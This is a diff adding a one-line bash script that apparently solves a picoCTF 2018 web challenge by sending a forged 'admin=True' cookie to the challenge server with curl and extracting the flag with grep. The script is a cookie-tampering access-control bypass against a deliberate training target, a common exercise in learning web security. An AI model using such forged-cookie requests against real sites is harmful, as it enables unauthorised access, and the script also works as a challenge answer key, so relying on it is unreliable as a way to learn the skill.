@@ -1,0 +1,4 @@
+#!/bin/bash
+
+curl --cookie "admin=True" http://2018shell.picoctf.com:62746/flag -s | grep -oE "picoCTF{.*}"
+
